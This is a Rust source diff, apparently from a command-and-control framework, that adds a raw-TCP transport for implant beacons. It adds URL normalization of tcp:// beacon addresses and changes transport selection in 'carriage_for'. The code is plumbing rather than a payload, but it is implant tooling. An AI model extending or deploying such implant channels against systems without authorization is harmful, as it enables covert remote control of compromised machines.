@@ -1,4 +1,5 @@
 pub mod http;
+pub mod rawtcp;
 pub mod stream;
 
 use std::sync::Arc;
@@ -100,20 +101,38 @@ pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], ack
 /// profile names one (the split-socket shape), else the front that answered
 /// the enrollment. The baked front carries scheme and authority (the dial
 /// shape the server bakes); the envelope route hangs off it, so a baked
-/// front without its own route gains the beacon path.
+/// front without its own route gains the beacon path. The socket family's
+/// dial carries no route at all -- the raw address the carriage connects
+/// to, normalized to its bare authority.
 pub fn dialed_beacon_url(profile: &Profile) -> String {
     if profile.beacon_url.is_empty() {
-        return beacon_url(&profile.enroll_url);
+        return normalize_socket_front(beacon_url(&profile.enroll_url));
     }
     let baked = profile.beacon_url.trim_end_matches('/');
-    if baked.contains("/implants/") {
-        return baked.to_string();
-    }
-    format!("{baked}/implants/beacon")
+    normalize_socket_front(if baked.contains("/implants/") {
+        baked.to_string()
+    } else {
+        format!("{baked}/implants/beacon")
+    })
 }
 
-/// The carriage the bake's mode names; poll is the default shape.
+/// The socket family's front shape: tcp:// plus the bare authority, any
+/// envelope-derived path dropped (the dial is the address, not a route).
+fn normalize_socket_front(front: String) -> String {
+    let Some(rest) = front.strip_prefix("tcp://") else {
+        return front;
+    };
+    let authority = rest.split('/').next().unwrap_or(rest);
+    format!("tcp://{authority}")
+}
+
+/// The carriage the bake's front and mode name: the socket family's dial
+/// picks the raw-TCP client (the mode choosing its poll or live shape),
+/// otherwise poll is the default and stream the WebSocket client.
 pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
+    if dialed_beacon_url(profile).starts_with("tcp://") {
+        return Box::new(rawtcp::RawTcp::new(profile));
+    }
     match profile.mode.as_str() {
         "stream" => Box::new(stream::Stream::new(profile)),
         _ => Box::new(http::Poll::new(profile)),
